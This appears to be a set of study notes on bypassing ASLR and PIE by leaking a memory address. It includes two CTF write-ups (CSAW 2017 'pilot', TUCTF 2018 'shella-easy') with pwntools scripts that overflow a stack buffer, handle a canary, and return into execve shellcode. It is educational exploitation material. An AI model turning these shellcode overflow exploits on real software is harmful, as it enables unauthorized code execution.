# PIE and ASLR

## ASLR

**Address Space Layout Randomization**  
The address of memory is randomized, but the offsets between various pieces of memory remain the same.  
To bypass ASLR we need to leak a memory address and calculate the offset to what we are targeting.  

`vmmap` can be used inside `gdb`/`pwndgb` to view memory addresses space.  
```bash
gdb vuln
b main
run
vmmap
```

An information leak isonly good for the region of memory that is leaked.
I.e. an address leaked in the `libc` region is only good for the `libc` region, it cannot be used to calculate the address space for things like the `heap` or `stack`.  

## PIE

**Position Indipendant Executable**  
PIE is very similar to ASLR but for the actual binary's code/memory regions.  
The exploit is the same as ASLR: Leak an address and calculate the offset to your target.  


---

## Challs That Give You a Leak

### Csaw 2017 pilot

This program prints out a memory address and then takes in user input.  
User input can overflow a buffer which will overwrite a return address on the stack.  

```bash
$ ./pilot      
[*]Welcome DropShip Pilot...
[*]I am your assitant A.I....
[*]I will be guiding you through the tutorial....
[*]As a first step, lets learn how to land at the designated location....
[*]Your mission is to lead the dropship to the right location and execute sequence of instructions to save Marines & Medics...
[*]Good Luck Pilot!....
[*]Location:0x7fff49f86a30
[*]Command:
```
When opening in GDB there are no clear function names. Using `objdump` helps to read the assembly.  
After setting breakpoints you find out that the leaked address points to the start of user input on the stack.  
 
The following exploit fills the buffer with shellcode, pads with nops to overflow the buffer and uses the leaked address  
to return to the start of the user input and execute the shellcode.  

```python3
#!/usr/bin/env python3
from pwn import *

context.log_level = "debug"

io = process("./pilot")

# Receive lines until the leaked address
io.recvuntil(b"[*]Location:")

# Grab the address
addr = io.recvline().strip(b'\n')

# Receive lines until the user input is required
io.recvuntil(b"[*]Command:")

# Set the offset to the return address
offset = 40

# Shellcode from https://www.exploit-db.com/exploits/36858
shellcode = b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"

# NOPSled to fill the buffer
nops = b"\x90" * (offset - len(shellcode))

# Build the payload
payload = shellcode + nops + p64(int(addr, 16))

# Send the payload and win
io.sendline(payload)
io.interactive()
```

### Tuctf 2018 shella-easy

This challenge is the same as above except it has a built in stack canary.  

```python3
#!/usr/bin/env python3
from pwn import *

context.log_level = "debug"
io = process("./shella-easy")

# Save the leaked address
io.recvuntil("have a ")
addr = int(io.recvline().strip(b" with a side of fries thanks\n"), 16)

offset = 64   # offset to the stack canary
check = p32(0xdeadbeef)   # Value to set the canary
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
nops = b"\x90" * (offset - len(shellcode))

# Shellcode, padding to the canary, the canary, padding to the leaked address, the leaked address
payload = shellcode + nops + check + (b"\x90" * 8) + p32(addr) 

io.sendline(payload)
io.interactive()
```
